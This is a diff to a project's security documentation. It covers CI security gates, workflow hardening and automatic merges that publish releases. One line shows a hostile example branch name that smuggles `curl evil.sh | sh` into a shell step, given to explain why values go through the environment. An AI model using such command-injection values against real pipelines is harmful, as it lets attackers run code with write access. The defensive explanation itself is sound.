@@ -271,14 +271,68 @@ runs during an image build.
 
 Keeping those pins current is a manual job. There is no bot proposing bumps,
 so a pinned SHA stays exactly where it is until somebody moves it — including
-when the version it points at has a published advisory. `npm audit` and
-`scripts/check-action-contracts.mjs` are what surface that; neither runs on a
-schedule, so both are worth a deliberate pass before a release.
+when the version it points at has a published advisory.
+
+CI's `security` job is what surfaces that, and it runs on every branch. Three
+of its checks are differential, comparing the branch against the default
+branch rather than against zero:
+
+- `scripts/check-audit.mjs` fails on a dependency advisory the branch
+  introduces, at `high` or above. An absolute gate is not usable here — the
+  mobile app carries Expo and React Native, which between them have twenty-odd
+  open advisories at any moment, and a gate that is red on an unchanged tree is
+  one everybody learns to merge past. Lowering the inherited count is always
+  welcome and never required.
+- CodeQL runs the `security-and-quality` suite, and the step after it fails on
+  a high or critical alert the branch introduces, keyed by rule and file. On
+  its own `codeql-action/analyze` never fails a build, so without that step an
+  automatic merge would sail straight past a fresh finding.
+- `scripts/check-action-contracts.mjs` reads each pinned action's `action.yml`
+  at its pinned SHA and checks it still accepts the inputs it is given.
+
+A fourth, `scripts/check-workflow-hardening.mjs`, is absolute: every workflow
+declares its own `permissions:`, every third-party action is pinned to a
+40-character SHA, and no `run:` block interpolates a context somebody outside
+the repository can write.
+
+That last one is the sharp edge, and it stopped being theoretical when a green
+run started merging itself. `${{ }}` is substituted as text before the shell
+sees the line, so a branch named `"; curl evil.sh | sh; #` interpolated into a
+`run:` block would execute — in a job whose token can write to the default
+branch. Values are passed through the environment instead, where the shell
+reads them as data.
 
 Release jobs run with `contents: read`; only the two jobs that publish are
-granted more, and only what they publish with. No workflow interpolates a
-`${{ }}` expression into a shell command — values are passed through the
-environment instead, so a version string cannot become shell syntax.
+granted more, and only what they publish with. In CI, only the `merge` job
+holds a write token: it runs no third-party code, only the `gh` CLI, and it
+merges nothing but the exact commit the rest of the run built — if the branch
+moved while the run was in flight, it stands down and leaves the newer run to
+decide.
+
+## Automatic merges
+
+A push to any branch but `main` opens a pull request, and a CI run in which
+every job succeeded squashes it onto `main`. There is no human in that loop by
+default, which is a deliberate trade and worth understanding before you rely
+on it.
+
+What it does not protect against: a change that is correct, builds cleanly,
+introduces no new advisory, and is still a bad idea. Code review is the
+control for that, and this arrangement makes review opt-in — mark the pull
+request as a draft, or label it `hold`, and it stays open until you say
+otherwise. Branches named `wip/*` or `draft/*` open as drafts already.
+
+Know what a merge reaches. A merge carrying a `Feat:` or a `Fix:` cuts a
+version tag and publishes it: npm under `latest`, a GitHub Release, installers
+and an APK people download. That is further than a merge used to reach, and it
+is the reason the checks above gate the merge rather than merely report on it.
+The `hold` label and the draft state are the two places to stop it, and both
+act before anything is published.
+
+If that trade is wrong for your fork, the merge is one job: delete `merge`
+from `.github/workflows/ci.yml` and the rest of the pipeline is unchanged.
+Requiring a review through branch protection also works — the merge simply
+fails until the review exists, since `GITHUB_TOKEN` cannot bypass it.
 
 ## Not covered
 
